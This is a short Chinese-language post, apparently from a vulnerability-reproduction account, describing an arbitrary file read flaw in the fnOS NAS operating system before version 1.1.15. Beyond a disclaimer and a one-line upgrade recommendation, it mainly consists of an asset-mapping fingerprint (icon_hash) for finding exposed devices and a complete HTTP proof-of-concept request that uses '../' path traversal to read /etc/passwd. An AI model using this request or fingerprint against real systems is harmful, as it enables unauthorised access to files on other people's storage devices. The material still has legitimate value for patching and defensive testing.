#  飞牛系统（fnOS）任意文件读取漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-02-03 02:57  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
  
01  
  
—  
  
漏洞名称  
  
  
飞牛系统（fnOS）任意文件读取漏洞  
  
  
02  
  
—  
  
影响版本  
  
受影响的版本为1.1.15以下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhK3MOUfjxyiaEYNHO4qWQLeSdZxE2niahUy5cBj9fYgPABfBDvXpDicmb8MurnpTCiaqFA9o6fEmEmQQA/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞简介  
  
飞牛系统（fnO  
S）是一款国产网  
络附加存储（NAS）操作系统  
。  
飞牛系统（fnOS）适合追求  
功能丰富、预算有限且对数据安全要求不高的用户，尤其适合闲置硬件改造和影视娱乐场景。  
攻击者通过构造恶意请求，利用路径遍历字符（如../  
）绕过系统路径限制  
，直接访问服务器文件系统中的任意文件。  
攻击者可尝试读取服务器上的/etc/passwd  
文件，若漏洞存在，服务器将返回文件内容。  
  
04  
  
—  
  
资产测绘  
```
icon_hash="470295793"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhK3MOUfjxyiaEYNHO4qWQLeS04afezrglf8fb5KmzwM51qlmF2annwejOQl3icxoNbZToPgOSTX60nQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
  
```
GET /app-center-static/serviceicon/myapp/{0}/?size=../../../../etc/passwd HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhK3MOUfjxyiaEYNHO4qWQLeSfYJFHjxAdf81RvhubnSNicsbaRN9AsnM8pGzA7m9Th6ZJ9bbjMLvlFw/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
升级到最新版本。  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  
  
  
  
  
